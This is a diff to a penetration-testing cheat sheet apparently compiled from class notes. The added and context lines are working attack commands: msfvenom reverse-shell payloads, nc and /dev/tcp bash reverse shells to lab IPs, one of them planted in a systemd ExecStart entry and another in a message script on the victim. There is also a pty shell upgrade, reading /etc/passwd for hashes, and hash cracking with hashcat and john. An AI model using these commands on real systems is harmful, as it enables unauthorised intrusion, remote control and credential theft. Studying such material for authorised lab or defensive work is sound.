@@ -1,6 +1,9 @@
 # PTD-Cheatsheet
 PTD Unit Cheat Sheet based on class notes
 
+### Python One Liner
+``` python3 -c 'import pty;pty.spawn("/bin/bash")' ```
+
 ## Recon
 
 ### Find name and IP
@@ -56,6 +59,10 @@ Lists the processes that are being launched in real time, including processes ow
 # Check mysql history for login details - cat .mysql_history'
 
  ```
+### Read Passwd file
+``` cat /etc/passwd ```
+``` If readable -> take password hash of the user: https://www.makeuseof.com/use-hashcat-to-crack-hashes-linux/```
+
 ### Upgrade meterpreter shell Windows
 1. Create a windows TCP reverse shell payload executable
 ```msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.49 LPORT=4446 -e x86/shikata_ga_nai -f exe -o reverse.exe```
@@ -131,6 +138,11 @@ Replace executable.exe with a reverse shell payload and restarting the service
 #!/bin/bash
 nc -e /bin/sh 192.168.x.x 4444
 ```
+### Reverse Bash RAW for message redirecting
+``` msfvenom -p cmd/unix/reverse_bash lhost=192.168.2.0 lport=4444 R```
+```OUTPUT = echo "0<&60-;exec 60<>/dev/tcp/192.168.1.106/1234;sh <&60 >&60 2>&60"```
+```Redirect this to message service on vulnerable machine e.g: echo "0<&60-;exec 60<>/dev/tcp/192.168.1.106/1234;sh <&60 >&60 2>&60" >> send_message_to_machine.sh```
+
 ### ExecStart exploit
 ``` ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/192.168.56.124/4444 0>&1'
 # To file: echo "/bin/bash -c 'bash -i >& /dev/tcp/192.168.56.124/4444 0>&1'" >> /tmp/wrapper.sh
@@ -157,6 +169,8 @@ hashcat -m 0 -a 0 md5.txt /usr/share/wordlists/rockyou.txt
 ```
 john hash --wordlist=/user/share/wordlists/rockyou.txt --format=md5crypt
 ```
+``` john hash --show```
+Include full passwd file entry in hash
 
 ## Helpful tools
 
